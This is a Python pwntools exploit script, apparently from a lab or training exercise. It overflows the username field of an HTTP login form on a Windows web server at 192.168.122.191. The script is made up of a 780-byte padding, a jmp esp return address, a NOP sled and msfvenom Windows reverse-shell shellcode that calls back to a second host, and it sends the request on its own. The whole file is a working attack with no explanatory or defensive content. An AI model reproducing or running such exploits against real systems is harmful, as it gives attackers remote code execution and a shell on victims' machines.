#!/usr/bin/env python3

from pwn import *


padding = b'\x41' * 780
nops =    b'\x90' * 32

# msfvenom -p windows/shell_reverse_tcp -b '\x00\x0a\x0d\x25\x26\x2b\x3d' -f py LHOST=192.168.122.231
shellcode =  b""
shellcode += b"\xbf\xef\xf0\xf2\xe7\xd9\xc7\xd9\x74\x24\xf4\x5a\x29"
shellcode += b"\xc9\xb1\x52\x83\xea\xfc\x31\x7a\x0e\x03\x95\xfe\x10"
shellcode += b"\x12\x95\x17\x56\xdd\x65\xe8\x37\x57\x80\xd9\x77\x03"
shellcode += b"\xc1\x4a\x48\x47\x87\x66\x23\x05\x33\xfc\x41\x82\x34"
shellcode += b"\xb5\xec\xf4\x7b\x46\x5c\xc4\x1a\xc4\x9f\x19\xfc\xf5"
shellcode += b"\x6f\x6c\xfd\x32\x8d\x9d\xaf\xeb\xd9\x30\x5f\x9f\x94"
shellcode += b"\x88\xd4\xd3\x39\x89\x09\xa3\x38\xb8\x9c\xbf\x62\x1a"
shellcode += b"\x1f\x13\x1f\x13\x07\x70\x1a\xed\xbc\x42\xd0\xec\x14"
shellcode += b"\x9b\x19\x42\x59\x13\xe8\x9a\x9e\x94\x13\xe9\xd6\xe6"
shellcode += b"\xae\xea\x2d\x94\x74\x7e\xb5\x3e\xfe\xd8\x11\xbe\xd3"
shellcode += b"\xbf\xd2\xcc\x98\xb4\xbc\xd0\x1f\x18\xb7\xed\x94\x9f"
shellcode += b"\x17\x64\xee\xbb\xb3\x2c\xb4\xa2\xe2\x88\x1b\xda\xf4"
shellcode += b"\x72\xc3\x7e\x7f\x9e\x10\xf3\x22\xf7\xd5\x3e\xdc\x07"
shellcode += b"\x72\x48\xaf\x35\xdd\xe2\x27\x76\x96\x2c\xb0\x79\x8d"
shellcode += b"\x89\x2e\x84\x2e\xea\x67\x43\x7a\xba\x1f\x62\x03\x51"
shellcode += b"\xdf\x8b\xd6\xf6\x8f\x23\x89\xb6\x7f\x84\x79\x5f\x95"
shellcode += b"\x0b\xa5\x7f\x96\xc1\xce\xea\x6d\x82\x30\x42\x17\xb5"
shellcode += b"\xd9\x91\xe7\x28\x46\x1f\x01\x20\x66\x49\x9a\xdd\x1f"
shellcode += b"\xd0\x50\x7f\xdf\xce\x1d\xbf\x6b\xfd\xe2\x0e\x9c\x88"
shellcode += b"\xf0\xe7\x6c\xc7\xaa\xae\x73\xfd\xc2\x2d\xe1\x9a\x12"
shellcode += b"\x3b\x1a\x35\x45\x6c\xec\x4c\x03\x80\x57\xe7\x31\x59"
shellcode += b"\x01\xc0\xf1\x86\xf2\xcf\xf8\x4b\x4e\xf4\xea\x95\x4f"
shellcode += b"\xb0\x5e\x4a\x06\x6e\x08\x2c\xf0\xc0\xe2\xe6\xaf\x8a"
shellcode += b"\x62\x7e\x9c\x0c\xf4\x7f\xc9\xfa\x18\x31\xa4\xba\x27"
shellcode += b"\xfe\x20\x4b\x50\xe2\xd0\xb4\x8b\xa6\xf1\x56\x19\xd3"
shellcode += b"\x99\xce\xc8\x5e\xc4\xf0\x27\x9c\xf1\x72\xcd\x5d\x06"
shellcode += b"\x6a\xa4\x58\x42\x2c\x55\x11\xdb\xd9\x59\x86\xdc\xcb"

payload = flat(
    padding,
    p32(0x10090c83), # jmp esp;
    nops, shellcode
)

body = flat(
    b'username=%s' % payload,
    b'&password=A'
)

request = flat(
    b'Host: 192.168.122.191\r\n',
    b'Accept: */*\r\n',
    b'Referer: http://192.168.122.191/login\r\n',
    b'Connection: close\r\n',
    b'Content-Type: application/x-www-form-urlencoded\r\n',
    b'Content-Length: %d\r\n' % len(body),
    b'\r\n',
    body
)

with remote('192.168.122.191', 80) as r:
    r.write(request)

